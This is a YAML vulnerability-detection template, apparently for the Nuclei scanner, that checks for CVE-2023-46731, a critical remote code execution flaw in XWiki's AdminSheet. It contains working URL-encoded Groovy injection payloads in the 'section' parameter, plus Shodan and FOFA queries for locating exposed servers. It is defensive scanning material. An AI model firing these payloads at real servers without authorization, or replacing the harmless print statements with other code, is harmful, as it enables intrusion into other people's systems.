id: CVE-2023-46731

info:
  name: XWiki Platform Remote Code Execution via AdminSheet
  author: ProjectDiscoveryAI
  severity: critical
  description: XWiki doesn't properly escape the 'section' URL parameter in XWiki.AdminSheet, allowing code execution.
  impact: |
    Successful exploitation could lead to unauthorized remote code execution.
  remediation: |
    Apply the latest security patches provided by XWiki to mitigate the vulnerability.
  reference:
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-62pr-qqf7-hh89
    - https://jira.xwiki.org/browse/XWIKI-21110
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2023-46731
    cwe-id: CWE-94
    epss-score: 0.00279
    epss-percentile: 0.69093
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/bin/get/Main/WebHome?sheet=XWiki.AdminSheet&viewer=content&section=%5D%5D%7B%7B%2Fhtml%7D%7D%7B%7Basync%7D%7D%7B%7Bgroovy%7D%7Dservices.logging.getLogger(%22attacker%22).error(%22Attack%20succeeded!%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D&xpage=view"
      - "{{BaseURL}}/xwiki/bin/get/XWiki/XWikiPreferences?section=%3C%25println(%22Hello%20from%20Groovy%22)%25%3E&xpage=view"

    matchers:
      - type: word
        words:
          - "Attack succeeded!"
          - "Hello from Groovy"
        part: body
        condition: or
